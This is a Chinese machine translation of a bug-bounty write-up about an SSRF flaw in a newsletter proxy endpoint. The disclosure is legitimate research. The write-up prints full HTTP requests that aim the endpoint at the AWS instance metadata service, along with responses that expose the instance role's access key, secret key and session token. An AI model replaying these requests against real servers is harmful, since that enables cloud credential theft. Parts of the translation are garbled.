<html>
<head>
<title>A tale of my first ever full SSRF bug</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">一个关于我第一只完整的SSRF虫的故事</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/a-tale-of-my-first-ever-full-ssrf-bug-4fe71a76e9c4?source=collection_archive---------0-----------------------#2020-06-22">https://infosecwriteups.com/a-tale-of-my-first-ever-full-ssrf-bug-4fe71a76e9c4?source=collection_archive---------0-----------------------#2020-06-22</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="d29e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在对一些公共项目的web应用程序进行了几周徒劳的搜索和探索之后，我决定休息一下，带着一个全新的想法回来。在本文中，我将探索一个服务器端请求伪造漏洞，它使我能够无限制地访问程序的实例元数据环境。这个bug可能将程序的Aws访问密钥泄露给了攻击者。这是我开始捕虫之旅以来最有趣的发现。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/f80a537ba0af22dd7d0eae72788c7f20.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WSEePtBQ5Zwgfupi2dQTAw.jpeg"/></div></div></figure><p id="c102" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我在HackerOne程序目录中寻找一个可以攻击的目标，这时我决定选择redacted。(这个程序很友好，让我写这篇文章，条件是我要做相关的修订)。</p><p id="298b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">浏览他们的政策页面把我带到了子域<a class="ae kx" href="https://redacted.redacted.com/" rel="noopener ugc nofollow" target="_blank">https://collate.redacted.com/</a>，我开始探索相关的功能。乍一看，似乎没有什么特别有趣的，但滚动到主页底部会显示一个文本框，网站访问者可以在其中提交他们的电子邮件地址，以订阅该公司的时事通讯。不要太花哨，对吗？我有一种直觉，想尝试了解在电子邮件提交过程中后台正在发出什么样的请求，所以我启动了burpsuite，在文本框中键入我的电子邮件地址，然后单击提交。</p><p id="dc45" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这时事情开始变得有趣起来，因为burpsuite中的请求显示，电子邮件正通过代理端点被路由到内部邮件列表。(从网址的结构来看，我可以断定它是MailChimp)。该电子邮件地址已通过以下post请求提交到后端</p><pre class="km kn ko kp gt ky kz la lb aw lc bi"><span id="5883" class="ld le iq kz b gy lf lg l lh li">POST /cloud-app/api/proxy-post?url=https%3A%2F%2Fredacted.eu11.list-manage.com%2Fsubscribe%2Fpost%3Fu%3D65bd5a1857b73643aad556093%26amp%3Bid%3D934e9ffdc5 HTTP/1.1 <br/>Host: collate.redacted.com <br/>Content-Length: 108 Authorization: ApiKey 123abc-123abc-123abc-123abc-3eedacebb860 <br/>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 <br/>Content-Type: application/x-www-form-urlencoded <br/>Accept: */* Origin: http://collate.redacted.com <br/>Referer: http://collate.redacted.com/cloud-app <br/>Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; <br/>Connection: close</span><span id="948f" class="ld le iq kz b gy lj lg l lh li">b_65bd5a1857b73643aad556093_934e9ffdc5=&amp;EMAIL=foobar@gmail.com</span></pre><p id="fe20" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是URL参数解码后的样子</p><p id="0cff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lk ll lm kz b">?url=<a class="ae kx" href="https://redacted.eu11.list-manage.com/subscribe/post?u=65bd5a1857b73643aad556093&amp;amp;id=934e9ffdc5" rel="noopener ugc nofollow" target="_blank">https://redacted.eu11.list-manage.com/subscribe/post?u=65bd5a1857b73643aad556093</a></code></p><p id="85c3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用来自我的burp collaborator客户机的有效负载修改上述请求中的URL参数导致服务器向所提供的collaborator URL发出HTTP请求。这证实了我的预感，即该应用程序容易受到SSRF的攻击。</p><p id="a978" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我试图检查我是否能够做一些进一步的内部服务枚举或读取本地文件，但没有运气。我也试过各种协议比如<strong class="jp ir"><em class="ln">【gopher://</em></strong><strong class="jp ir"><em class="ln">file://</em></strong><strong class="jp ir"><em class="ln">LDAP://</em></strong>或者<strong class="jp ir"> <em class="ln"> FTP:// </em> </strong>。不幸的是，这些不被支持，使得<strong class="jp ir"> <em class="ln"> http:// </em> </strong>和<strong class="jp ir"> <em class="ln"> https:// </em> </strong>成为仅有的两个可用选项。</p><p id="6c43" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，我将URL参数指向https://169 . 254 . 169 . 254/latest/user-data，这样我就可以尝试访问应用程序的云元数据环境。我拒绝了这个请求，然后嘣！，我收到了带有一些Amazon <strong class="jp ir"> EC2实例</strong>元数据的响应。(注意从post到get请求的变化)。</p><pre class="km kn ko kp gt ky kz la lb aw lc bi"><span id="67d2" class="ld le iq kz b gy lf lg l lh li">GET /cloud-app/api/proxy-post?url=http%3A%2F%2F169.254.169.254%2Flatest/user-data%3Fu%3D65bd5a1857b73643aad556093%26amp%3Bid%3D934e9ffdc5 HTTP/1.1 <br/>Host: collate.redacted.com <br/>Content-Length: 108 Authorization: ApiKey 123abc-123abc-123abc-123abc-3eedacebb860 <br/>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 <br/>Content-Type: application/x-www-form-urlencoded <br/>Accept: */* Origin: http://collate.redacted.com <br/>Referer: http://collate.redacted.com/cloud-app <br/>Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; <br/>Connection: close</span><span id="d412" class="ld le iq kz b gy lj lg l lh li">b_65bd5a1857b73643aad556093_934e9ffdc5=&amp;EMAIL=foobar@gmail.com</span></pre><p id="e148" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">反应</p><pre class="km kn ko kp gt ky kz la lb aw lc bi"><span id="a0d5" class="ld le iq kz b gy lf lg l lh li">HTTP/1.1 200 OK <br/>Date: Sun, 17 May 2020 06:59:20 GMT <br/>Content-Type: text/html; charset=utf-8 <br/>Content-Length: 66 <br/>Connection: close <br/>Set-Cookie: AWSALB=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; Expires=Sun, 24 May 2020 06:59:20 GMT; Path=/ <br/>Set-Cookie: AWSALBCORS=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; Expires=Sun, 24 May 2020 06:59:20 GMT; Path=/; SameSite=None X-DNS-Prefetch-Control: off <br/>X-Frame-Options: SAMEORIGIN <br/>Strict-Transport-Security: max-age=15552000; <br/>includeSubDomains <br/>X-Download-Options: noopen <br/>X-Content-Type-Options: nosniff <br/>X-XSS-Protection: 1; mode=block <br/>ETag: W/”42-TCtERKSIzlhv3bS2BY0KADPY5wI” <br/>Vary: Accept-Encoding </span><span id="2510" class="ld le iq kz b gy lj lg l lh li">#!/bin/bash echo ECS_CLUSTER=cloud-app &gt;&gt;/etc/ecs/ecs.config</span></pre><p id="4cd1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">快速浏览一下<a class="ae kx" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" rel="noopener ugc nofollow" target="_blank"> Swissky的回购</a>让我经历了更多的AWS端点。通过下面的请求访问AWS访问令牌后，就该写报告并提交报告了。</p><pre class="km kn ko kp gt ky kz la lb aw lc bi"><span id="1092" class="ld le iq kz b gy lf lg l lh li">GET /cloud-app/api/proxy-post?url=http%3A%2F%2F169.254.169.254%2F/latest/meta-data/iam/security-credentials/ecsInstanceRole%3Fu%3D65bd5a1857b73643aad556093%26amp%3Bid%3D934e9ffdc5 HTTP/1.1 <br/>Host: collate.redacted.com <br/>Content-Length: 108 Authorization: ApiKey 123abc-123abc-123abc-123abc-3eedacebb860 <br/>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 <br/>Content-Type: application/x-www-form-urlencoded <br/>Accept: */* Origin: http://collate.redacted.com <br/>Referer: http://collate.redacted.com/cloud-app <br/>Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; <br/>Connection: close</span><span id="4e89" class="ld le iq kz b gy lj lg l lh li">b_65bd5a1857b73643aad556093_934e9ffdc5=&amp;EMAIL=foobar@gmail.com</span></pre><p id="6693" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">反应</p><pre class="km kn ko kp gt ky kz la lb aw lc bi"><span id="34c3" class="ld le iq kz b gy lf lg l lh li">HTTP/1.1 200 OK<br/>Date: Sun, 17 May 2020 07:10:22 GMT<br/>Content-Type: text/html; charset=utf-8<br/>Connection: close<br/>Set-Cookie: AWSALB=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; Expires=Sun, 24 May 2020 07:10:22 GMT; Path=/<br/>Set-Cookie: AWSALBCORS=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; Expires=Sun, 24 May 2020 07:10:22 GMT; Path=/; SameSite=None<br/>X-DNS-Prefetch-Control: off<br/>X-Frame-Options: SAMEORIGIN<br/>Strict-Transport-Security: max-age=15552000; includeSubDomains<br/>X-Download-Options: noopen<br/>X-Content-Type-Options: nosniff<br/>X-XSS-Protection: 1; mode=block<br/>ETag: W/"51e-72BiEi+3aW7IjJYcC8EZFrrQfKQ"<br/>Vary: Accept-Encoding<br/>Content-Length: 1310</span><span id="9945" class="ld le iq kz b gy lj lg l lh li">{<br/>"Code" : "Success",<br/>"LastUpdated" : "2020-05-17T07:06:54Z",<br/>"Type" : "AWS-HMAC",<br/>"AccessKeyId" : "ASIAV6SVWBIP2VKA2AHR",<br/>"SecretAccessKey" : "IC4L8G8VO0H16anm1Fw1FQKJY9IbyTkIE4dIbHUK",<br/>"Token" : "IQoJb3JpZ2luX2VjEHAaCXVzLWVhc3QtMSJIMEYCIQD1lkZWbH1i1R1P8ijIQtkSYkykzY1ylbzVtfa4xt2h7gIhAKIFm9E98JfziETZSJL39G5NEGdsmftFOr0MrAFNg2GqKr0DCLj//////////wEQABoMNDA5Mjc1MzM3MjQ3IgxJCGj22YKawd4HhLUqkQMjg/WFZ5vCZH2BpJn8mPTR3L/p2QnTRyQyyHztHuLOX1JKH9/13ClgWXJSo+oSL+bPxt7cIfFg/dXCDVmhZGifCBh2aMpR8ENWct9kBfZI6ebU7EoXrjtIEZ0NH21kM7qLpHRLWuqNPoKpBTxHnXMt9kGSkvF6KjgcjveJDhJbpzodLMDMFWLd5Q1l/7a9aOTpDzydQVI69CBvzyhHXLm59s61/LFRyfulZaSQe78+BbEPlphj1EudDyXgbwfX/TH5M/r6n2SoA9/37uMFi671pcZUhf+YiWwHzi6tbWbA2UeGPpsNJjzTIWSGgUv8Je/+PIMDsD3zZbn9iVkBwrpfaHsEvg7VglrL9XDU+TYx7RtPjQM86KlvdSlp5Cm2XaMzMd4rcuADG1TpbaCcLJCScgfpPn1Hp1L9NMqdw0eCTRU09DEgIqntokqoCjQXxRYNHsloV7P0/Mv0OSzF0GTARMUBOYV7w6YR5M+Wed5xmWxBKWvKperSiseZaPtFMUBrLNv+CWvg4ZWi3CjqhfNg3DCWxYP2BTrqAVxRGw3KZLei6uiHAWkpSTHK7nJPzavBABylkMy18XkbgdrWB6LmqBX/EtKaXEDpcjb0fWjGCybaOEDuFoJRnMV2o1z05b3iciC06PGqPob0d0ZKqTmd5aB2rzbGA90U30nzk5BYrPA20vRXZdk4xIUZu3YbCYcMF80Fv0XIJPvU1I/n37kdkXN03x5K9SEX5DlH5qH/hZe1p+szm5AA8zjeXkSwX00E48NvwuXmlCF7zoyIg2fukOiBIwSzqCdgGBEjOQ0beAmMh8Dx/zledq/oCU0MpoVdtc2gNAiKqodPVz/17RoCMOKzng==",<br/>"Expiration" : "2020-05-17T13:08:34Z"<br/>}</span></pre><p id="8c0f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我提交报告的几个小时后，这个特性就被禁用了，因为项目工程师正在着手解决这个问题。</p><p id="2708" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在接下来的几个月里，我获得了1000美元的奖金。</p><p id="0746" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="ln">时间轴:</em> </strong></p><p id="5ef3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ln">2020年5月17日—报道。</em></p><p id="080e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ln">2020年5月18日—分庭审理。</em></p><p id="925c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ln">2020年5月18日—功能禁用</em></p><p id="0ab3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ln">2020年6月11日——奖金发放</em></p></div></div>    
</body>
</html>